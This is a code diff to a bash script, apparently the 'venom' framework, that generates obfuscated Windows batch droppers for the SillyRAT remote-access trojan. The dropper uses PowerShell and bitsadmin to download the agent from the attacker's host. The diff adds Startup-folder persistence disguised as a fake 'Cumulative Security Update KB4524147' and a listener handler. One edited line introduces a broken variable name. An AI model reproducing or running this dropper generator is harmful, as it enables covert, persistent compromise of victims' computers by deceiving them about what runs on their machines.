@@ -10275,6 +10275,7 @@ Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Pr
 SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
 if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
+random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
 easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
@@ -10337,25 +10338,21 @@ if [ "$SOSP" = "Windows" ]; then
       echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll \$C=p\"i\"%@%p sh%@%o^w t\"a\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p i\"n\"s%@%t^a%@%ll t\"a\"b%@%u^la%@%te py%@%n^pu%@%t p\"s\"u%@%t^i%@%l pi%@%l^l%@%o\"w\" pys%@%cr^ee%@%ns%@%h^ot p\"y\"i%@%ns^t%@%a\"l\"l%@%e^r}" >> $Drop.bat
       echo "@Po%@i%w\"E\"r%@i%s^He%@$%ll (nE%@i%W-Obj%@%eCt -Com^O%@$%bjec%@_%t Wsc%d0b%rip^t%#?%She%@$%l^l)%#?%Po%#i%pu^p(\"\"\"Ins%@$%tala%@i%tio%@s%n Com%@s%ple%@$%te%@_%d.%#?%\"\"\",4,\"\"\"$Drop - 3%#?%10%#?%5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $Drop.bat
       echo "@pOw^e%@%rS^h\"E\"%@_%lL %\$\$% bi%@$%t^s\"a\"%@i%d^m%@f%in %i()%/t^ra%@i%n\"s\"%@$%f^er pu%@%r^pl%@%e\"t\"e%@%a^m /do%@_%w^n%@i%l\"o\"%@#1%ad %(f$)%/p^ri%@$%or\"i\"%@i%ty fo%@$%r\"e\"g%@'%ro^u%@$%nd %-%ht%@%tp:/%@%/$lhost/$Drop.%\$i% $wvd\\$Drop.%\$i%" >> $Drop.bat
-      echo "@c%@$%d $rpath &%@%& =pY%@%t^H%@%o\"N\" $Drop.%\$i%" >> $Drop.bat
       echo "${BlueF}[☠]${white} Written $Drop.bat (obfuscated)"${Reset};sleep 2
 
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
+      wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
       persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147.update.bat on remote startup folder that\nruns '$Drop.py' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
       if [ "$persistence" = "Add persistence" ]; then
          echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
-         echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
          echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
          echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
-         echo "echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
-         echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
-         echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
-         echo "echo cd $rpath && python $Drop.py >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
-         echo "echo netstat -ano^|findstr \"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
-         echo "echo if %%errorlevel%% EQU 0 (exit) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
-         echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
+         echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
+         echo "echo Powershell -w 1 cd $wvd;python $Drop.py >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
          echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
       fi
+      echo "@c%@$%d $rpath &%@%& =pY%@%t^H%@%o\"N\" $Drop.%\$i%" >> $Drop.bat
+      echo "=Exit" >> $Drop.bat
 
    else
 
@@ -10533,6 +10530,24 @@ cp $IPATH/bin/SillyRAT/server.py $IPATH/output/server.py > /dev/nul 2>&1
 echo "" && python3 server.py bind --address 0.0.0.0 --port $lport
 cd $IPATH
 sleep 2
+
+
+dtr=$(date|awk {'print $1,$2,$3,$4'})
+if [ "$persistence" = "Add persistence" ]; then
+   ## Write how to delete persistence to output folder ..
+   echo "ACTIVE_ON: $dtr" > $IPATH/output/persistence.handler
+   echo "LPORT    : $lport" >> $IPATH/output/persistence.handler
+   echo "LHOST    : $lhost" >> $IPATH/output/persistence.handler
+   echo "HANDLER  : cd bin/SillyRAT/ && service apache2 start" >> $IPATH/output/persistence.handler
+   echo "HANDLER  : python3 server.py bind --address 0.0.0.0 --port $lport" >> $IPATH/output/persistence.handler
+   echo "+-----------------------------------------+" >> $IPATH/output/persistence.handler
+   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence.handler
+   echo "+-----------------------------------------+" >> $IPATH/output/persistence.handler
+   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence.handler
+   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $IPATH/output/persistence.handler
+   zenity --title="☠ SillyRAT persistence ☠" --text "REMARK: Settings related to persistence stored under:\npersistence.handler" --info > /dev/null 2>&1
+
+fi
 
 
 ## Clean old files.
@@ -12345,7 +12360,7 @@ cat << !
     LOLBin             : Powershell|bitsadmin|Wget (DownloadFile)
     DROPPER EXTENSION  : BAT
     AGENT EXTENSION    : PY
-    AGENT PERSISTENCE  : NOT AVAILABLE
+    AGENT PERSISTENCE  : AVAILABLE
 
     AGENT Nº7
     ─────────
@@ -12927,7 +12942,7 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "LHOST:$lhost" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "HANDLER_DIR:venom/output" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "HANDLER:sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "ACTIVE_ON=$dtr" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "ACTIVE_ON=$dtr" >> $IPATH/output/persistence_ID_$random_nafme.handler
    echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/persistence_ID_$random_name.handler
